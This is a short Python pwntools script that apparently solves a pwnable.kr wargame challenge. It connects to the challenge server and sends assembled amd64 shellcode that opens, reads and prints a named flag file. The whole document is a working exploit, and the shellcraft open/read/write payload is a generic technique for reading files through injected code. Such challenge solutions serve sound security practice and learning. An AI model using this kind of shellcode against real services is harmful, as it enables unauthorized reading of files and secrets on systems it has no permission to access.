from pwn import *

context(arch='amd64', os='linux')
r = remote('pwnable.kr', 9026)
filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

shellcode = ""
# shellcraft.open(filename) = shellcraft.pushstr(filename) + shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.open(filename)
# 3 can be replaced by 'rax' since the return value of open is the fd of file
shellcode += shellcraft.read(3, 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

r.recvuntil('shellcode: ')
r.send(asm(shellcode))
print(r.recvlineS().strip())

r.close()